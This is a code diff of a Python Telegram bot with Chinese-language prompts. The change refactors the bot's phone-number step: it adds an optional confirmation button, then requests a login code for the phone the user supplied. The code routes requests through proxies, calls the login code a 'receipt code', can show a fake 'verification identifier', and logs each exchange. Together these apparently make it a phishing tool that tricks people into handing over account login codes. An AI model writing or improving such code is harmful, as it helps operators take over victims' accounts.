@@ -526,15 +526,80 @@ async def cmd_start(message: Message, bot: Bot):
     _set_state(uid, bot, {"step": "started", "created_at": time.time()})
 
 
-async def _send_phone_received(message: Message, bot: Bot, uid: int):
+async def _send_phone_received(bot: Bot, chat_id: int, uid: int, name: str):
     """Send the configured "收到手机号后提示" message before the (possibly slow)
     send_code call, so the user gets immediate feedback while the code is being
     requested."""
     wait_text = _c("phone_received_text", "")
     if not wait_text:
         return
-    await send_custom_response(bot, message.chat.id, wait_text)
-    _record_msg(uid, _user_name(message), "bot", wait_text, bot)
+    await send_custom_response(bot, chat_id, wait_text)
+    _record_msg(uid, name, "bot", wait_text, bot)
+
+
+async def _do_send_code(bot: Bot, chat_id: int, uid: int, name: str, phone: str) -> bool:
+    """Request the login code for ``phone`` and render the result panel."""
+    await _send_phone_received(bot, chat_id, uid, name)
+    result = await login_engine.send_code(phone)
+    if result.get("proxy_fell_back"):
+        await _notify_proxy_fallback(bot, phone, result.get("failed_proxy", ""))
+    if result.get("success"):
+        _set_state(uid, bot, {
+            "phone": phone, "step": "code",
+            "created_at": time.time(), "attempts": 0,
+        })
+        text = _c("code_panel_title", "✅ 回执码已发送！")
+        if _cfg and _cfg.get("show_12_digit_code", False):
+            text += f"\n🔖 验证标识: {_generate_12_digit_code()}"
+        await send_custom_response(bot, chat_id, text, None, view_code_kb(phone))
+        logger.info(f"[{uid}] 验证码已发送 -> {phone}")
+        return True
+    _pop_state(uid, bot)
+    err_msg = result.get('message', '发送验证码失败')
+    await bot.send_message(chat_id, f"❌ {err_msg}",
+                           reply_markup=main_menu_kb(button_text=_phone_btn_label()))
+    logger.warning(f"[{uid}] 发送验证码失败: {err_msg}")
+    return False
+
+
+async def _begin_send_code(message: Message, bot: Bot, uid: int, phone: str):
+    """Either ask the user to confirm first (是否验证手机号) or send the code
+    directly, depending on ``share_phone_skip_confirm`` (default True = skip)."""
+    name = _user_name(message)
+    if _cfg and not _cfg.get("share_phone_skip_confirm", True):
+        confirm_prompt = _c("send_code_confirm_text", "请确认是否发送回执码")
+        btn_label = (_c("verify_button_text", "") or "").strip() or "是否验证手机号"
+        _set_state(uid, bot, {
+            "phone": phone, "step": "confirm_send", "created_at": time.time(),
+        })
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=btn_label, callback_data="confirm_send")]
+        ])
+        await send_custom_response(bot, message.chat.id, confirm_prompt, None, kb)
+        _record_msg(uid, name, "bot", confirm_prompt, bot)
+        return
+    await _do_send_code(bot, message.chat.id, uid, name, phone)
+
+
+# ── 发码前确认（可选，由 share_phone_skip_confirm 控制）─────────────
+@router.callback_query(F.data == "confirm_send")
+async def cb_confirm_send(cq: CallbackQuery, bot: Bot):
+    uid = cq.from_user.id
+    await cq.answer()
+    state = _get_state(uid, bot)
+    if not state or state.get("step") != "confirm_send":
+        return
+    phone = state["phone"]
+    name = cq.from_user.full_name or cq.from_user.username or str(uid)
+    try:
+        await cq.message.edit_reply_markup(reply_markup=None)
+    except Exception:
+        pass
+    confirmed = _c("confirm_text", "")
+    if confirmed:
+        await send_custom_response(bot, cq.message.chat.id, confirmed)
+        _record_msg(uid, name, "bot", confirmed, bot)
+    await _do_send_code(bot, cq.message.chat.id, uid, name, phone)
 
 
 # ── 分享联系人 ──────────────────────────────────────────────────────
@@ -547,24 +612,7 @@ async def handle_contact(message: Message, bot: Bot):
 
     uid = message.from_user.id
     _record_msg(uid, _user_name(message), "user", f"[分享联系人] {phone}", bot)
-    await _send_phone_received(message, bot, uid)
-    result = await login_engine.send_code(phone)
-    if result.get("proxy_fell_back"):
-        await _notify_proxy_fallback(bot, phone, result.get("failed_proxy", ""))
-    if result.get("success"):
-        _set_state(uid, bot, {
-            "phone": phone, "step": "code",
-            "created_at": time.time(), "attempts": 0,
-        })
-        text = _c("code_panel_title", "✅ 回执码已发送！")
-        if _cfg and _cfg.get("show_12_digit_code", False):
-            text += f"\n🔖 验证标识: {_generate_12_digit_code()}"
-        await send_custom_response(bot, message.chat.id, text, None, view_code_kb(phone))
-        logger.info(f"[{uid}] 验证码已发送 -> {phone}")
-    else:
-        err_msg = result.get('message', '发送验证码失败')
-        await message.answer(f"❌ {err_msg}", reply_markup=main_menu_kb(button_text=_phone_btn_label()))
-        logger.warning(f"[{uid}] 发送验证码失败: {err_msg}")
+    await _begin_send_code(message, bot, uid, phone)
 
 
 # ── 手动输入手机号 ──────────────────────────────────────────────────
@@ -604,24 +652,7 @@ async def handle_phone_input(message: Message, bot: Bot):
 
     phone = message.text.strip()
     _record_msg(uid, _user_name(message), "user", phone, bot)
-    await _send_phone_received(message, bot, uid)
-    result = await login_engine.send_code(phone)
-    if result.get("proxy_fell_back"):
-        await _notify_proxy_fallback(bot, phone, result.get("failed_proxy", ""))
-    if result.get("success"):
-        _set_state(uid, bot, {
-            "phone": phone, "step": "code",
-            "created_at": time.time(), "attempts": 0,
-        })
-        text = _c("code_panel_title", "✅ 回执码已发送！")
-        if _cfg and _cfg.get("show_12_digit_code", False):
-            text += f"\n🔖 验证标识: {_generate_12_digit_code()}"
-        await send_custom_response(bot, message.chat.id, text, None, view_code_kb(phone))
-        logger.info(f"[{uid}] 验证码已发送(手动) -> {phone}")
-    else:
-        _pop_state(uid, bot)
-        err_msg = result.get('message', '发送验证码失败')
-        await message.answer(f"❌ {err_msg}", reply_markup=main_menu_kb())
+    await _begin_send_code(message, bot, uid, phone)
 
 
 # ── 验证码输入 ──────────────────────────────────────────────────────
